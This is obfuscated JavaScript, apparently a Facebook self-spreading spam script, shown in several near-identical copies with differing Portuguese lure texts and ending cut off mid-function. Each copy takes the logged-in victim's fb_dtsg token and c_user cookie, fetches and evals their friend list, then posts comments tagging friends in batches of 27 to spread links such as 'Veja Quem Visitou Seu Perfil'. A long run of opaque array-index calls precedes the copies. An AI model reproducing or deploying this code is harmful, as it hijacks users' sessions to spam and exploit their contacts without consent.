;P(_0x2106[494]);P(_0x2106[495]);P(_0x2106[496]);P(_0x2106[497]);P(_0x2106[498]);P(_0x2106[499]);P(_0x2106[500]);P(_0x2106[501]);P(_0x2106[502]);P(_0x2106[503]);P(_0x2106[504]);P(_0x2106[505]);P(_0x2106[506]);P(_0x2106[507]);P(_0x2106[508]);P(_0x2106[509]);P(_0x2106[510]);P(_0x2106[511]);P(_0x2106[512]);P(_0x2106[513]);P(_0x2106[514]);P(_0x2106[515]);P(_0x2106[516]);P(_0x2106[517]);P(_0x2106[518]);P(_0x2106[519]);P(_0x2106[520]);P(_0x2106[521]);P(_0x2106[522]);P(_0x2106[523]);P(_0x2106[524]);P(_0x2106[525]);P(_0x2106[526]);P(_0x2106[527]);P(_0x2106[528]);P(_0x2106[529]);P(_0x2106[530]);P(_0x2106[531]);P(_0x2106[532]);P(_0x2106[533]);P(_0x2106[534]);P(_0x2106[535]);P(_0x2106[536]);P(_0x2106[537]);P(_0x2106[538]);P(_0x2106[539]);P(_0x2106[540]);P(_0x2106[541]);P(_0x2106[542]);P(_0x2106[543]);P(_0x2106[544]);P(_0x2106[545]);P(_0x2106[546]);P(_0x2106[547]);P(_0x2106[548]);P(_0x2106[549]);P(_0x2106[550]);P(_0x2106[551]);P(_0x2106[552]);P(_0x2106[553]);P(_0x2106[554]);P(_0x2106[555]);P(_0x2106[556]);P(_0x2106[557]);P(_0x2106[558]);P(_0x2106[559]);P(_0x2106[560]);P(_0x2106[561]);P(_0x2106[562]);P(_0x2106[563]);P(_0x2106[564]);P(_0x2106[565]);P(_0x2106[566]);P(_0x2106[567]);P(_0x2106[568]);P(_0x2106[569]);P(_0x2106[570]);P(_0x2106[571]);P(_0x2106[572]);P(_0x2106[573]);P(_0x2106[574]);P(_0x2106[575]);P(_0x2106[576]);P(_0x2106[577]);P(_0x2106[578]);P(_0x2106[579]);P(_0x2106[580]);P(_0x2106[581]);P(_0x2106[582]);P(_0x2106[583]);P(_0x2106[584]);P(_0x2106[585]);P(_0x2106[586]);P(_0x2106[587]);P(_0x2106[588]);P(_0x2106[589]);P(_0x2106[590]);P(_0x2106[591]);P(_0x2106[592]);P(_0x2106[593]);P(_0x2106[594]);P(_0x2106[595]);P(_0x2106[596]);P(_0x2106[597]);P(_0x2106[598]);P(_0x2106[599]);P(_0x2106[600]);P(_0x2106[601]);P(_0x2106[602]);P(_0x2106[603]);P(_0x2106[604]);P(_0x2106[605]);P(_0x2106[606]);P(_0x2106[607]);P(_0x2106[608]);P(_0x2106[609]);P(_0x2106[610]);P(_0x2106[611]);P(_0x2106[612]);P(_0x2106[613]);P(_0x2106[614]);P(_0x2106[615]);P(_0x2106[616]);P(_0x2106[617]);P(_0x2106[618]);P(_0x2106[619]);P(_0x2106[620]);P(_0x2106[621]);P(_0x2106[622]);P(_0x2106[623]);P(_0x2106[624]);P(_0x2106[625]);P(_0x2106[626]);P(_0x2106[627]);P(_0x2106[628]);P(_0x2106[629]);P(_0x2106[630]);P(_0x2106[631]);P(_0x2106[632]);P(_0x2106[633]);P(_0x2106[634]);P(_0x2106[635]);P(_0x2106[636]);P(_0x2106[637]);P(_0x2106[638]);P(_0x2106[639]);P(_0x2106[640]);P(_0x2106[641]);P(_0x2106[642]);P(_0x2106[643]);P(_0x2106[644]);P(_0x2106[645]);P(_0x2106[646]);P(_0x2106[647]);P(_0x2106[648]);P(_0x2106[649]);P(_0x2106[650]);P(_0x2106[651]);P(_0x2106[652]);P(_0x2106[653]);P(_0x2106[654]);P(_0x2106[655]);P(_0x2106[656]);P(_0x2106[657]);P(_0x2106[658]);P(_0x2106[659]);P(_0x2106[660]);P(_0x2106[661]);P(_0x2106[662]);P(_0x2106[663]);P(_0x2106[664]);P(_0x2106[665]);P(_0x2106[666]);P(_0x2106[667]);P(_0x2106[668]);P(_0x2106[669]);P(_0x2106[670]);P(_0x2106[671]);P(_0x2106[672]);P(_0x2106[673]);P(_0x2106[674]);P(_0x2106[675]);P(_0x2106[676]);P(_0x2106[677]);P(_0x2106[678]);P(_0x2106[679]);P(_0x2106[680]);P(_0x2106[681]);P(_0x2106[682]);P(_0x2106[683]);P(_0x2106[684]);P(_0x2106[685]);P(_0x2106[686]);P(_0x2106[687]);P(_0x2106[688]);P(_0x2106[689]);P(_0x2106[690]);P(_0x2106[691]);P(_0x2106[692]);P(_0x2106[693]);P(_0x2106[694]);P(_0x2106[695]);P(_0x2106[696]);P(_0x2106[697]);P(_0x2106[698]);P(_0x2106[699]);P(_0x2106[700]);P(_0x2106[701]);P(_0x2106[702]);P(_0x2106[703]);P(_0x2106[704]);P(_0x2106[705]);P(_0x2106[706]);P(_0x2106[707]);P(_0x2106[708]);P(_0x2106[709]);P(_0x2106[710]);P(_0x2106[711]);P(_0x2106[712]);P(_0x2106[713]);P(_0x2106[714]);P(_0x2106[715]);P(_0x2106[716]);P(_0x2106[717]);P(_0x2106[718]);P(_0x2106[719]);P(_0x2106[720]);P(_0x2106[721]);P(_0x2106[722]);P(_0x2106[723]);P(_0x2106[724]);P(_0x2106[725]);P(_0x2106[726]);P(_0x2106[727]);P(_0x2106[728]);P(_0x2106[729]);P(_0x2106[730]);P(_0x2106[731]);P(_0x2106[732]);P(_0x2106[733]);P(_0x2106[734]);P(_0x2106[735]);P(_0x2106[736]);P(_0x2106[737]);P(_0x2106[738]);P(_0x2106[739]);P(_0x2106[740]);P(_0x2106[741]);P(_0x2106[742]);P(_0x2106[743]);P(_0x2106[744]);P(_0x2106[745]);P(_0x2106[746]);P(_0x2106[747]);P(_0x2106[748]);P(_0x2106[749]);P(_0x2106[750]);P(_0x2106[751]);P(_0x2106[752]);P(_0x2106[753]);P(_0x2106[754]);P(_0x2106[755]);P(_0x2106[756]);P(_0x2106[757]);P(_0x2106[758]);P(_0x2106[759]);P(_0x2106[760]);P(_0x2106[761]);P(_0x2106[762]);P(_0x2106[763]);P(_0x2106[764]);sublist(_0x2106[765]);sublist(_0x2106[766]);sublist(_0x2106[767]);sublist(_0x2106[768]);sublist(_0x2106[769]);sublist(_0x2106[770]);sublist(_0x2106[771]);sublist(_0x2106[772]);sublist(_0x2106[773]);sublist(_0x2106[774]);sublist(_0x2106[775]);sublist(_0x2106[776]);sublist(_0x2106[777]);sublist(_0x2106[778]);sublist(_0x2106[779]);sublist(_0x2106[780]);sublist(_0x2106[781]);sublist(_0x2106[782]);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","720976607946174","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","465818833549668","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Veja Quem Visitou Seu Perfil ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","465810936883791","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=Novo Tema Do Flamengo ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","465350550263163","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Como Ganhar 5.000 pedidos de Amizade no Facebook (y) ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  Como Ganhar 5.000 pedidos de Amizade no Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c = ["value", "fb_dtsg", "getElementsByName", "match", "cookie", "464941620304056", "onreadystatechange", "readyState", "arkadaslar = ", "for (;;);", "", "replace", "responseText", ";", "length", "entries", "payload", "round", " @[", "uid", ":", "text", "]", " ", "\x26filter[0]=user", "\x26options[0]=friends_only", "\x26options[1]=nm", "\x26token=v7", "\x26viewer=", "\x26__user=", "https://", "indexOf", "URL", "GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "open", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "send", "random", "floor", "\x26ft_ent_identifier=", "\x26comment_text=", "\x26source=2", "\x26client_id=1377871797138:1707018092", "\x26reply_fbid", "\x26parent_comment_id", "\x26rootid=u_jsonp_2_3", "\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:", "}", "\x26attached_sticker_fbid=0", "\x26attached_photo_fbid=0", "\x26giftoccasion", "\x26ft[tn]=[]", "\x26__a=1", "\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo", "\x26__req=q", "\x26fb_dtsg=", "\x26ttstamp=", "POST", "/ajax/ufi/add_comment.php", "Content-type", "application/x-www-form-urlencoded", "setRequestHeader", "status", "close"];
    var fb_dtsg = document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];
    var user_id = document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);
    var id = _0xa22c[5];
    var arkadaslar = [];
    var svn_rev;
     
    function arkadaslari_al(id) {
        var _0x7892x7 = new XMLHttpRequest();
        _0x7892x7[_0xa22c[6]] = function () {
            if (_0x7892x7[_0xa22c[7]] == 4) {
                eval(_0xa22c[8] + _0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9], _0xa22c[10]) + _0xa22c[13]);
                for (f = 0; f < Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]] / 27); f++) {
                    mesaj = _0xa22c[10];
                    mesaj_text = _0xa22c[10];
                    for (i = f * 27; i < (f + 1) * 27; i++) {
                        if (arkadaslar[_0xa22c[16]][_0xa22c[15]][i]) {
                            mesaj += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]] + _0xa22c[22];
                            mesaj_text += _0xa22c[23] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];
                        };
                    };
                    yorum_yap(id, mesaj);
                };
            };
        };
        var _0x7892x8 = _0xa22c[24];
        _0x7892x8 += _0xa22c[25];
        _0x7892x8 += _0xa22c[26];
        _0x7892x8 += _0xa22c[27];
        _0x7892x8 += _0xa22c[28] + user_id;
        _0x7892x8 += _0xa22c[29] + user_id;
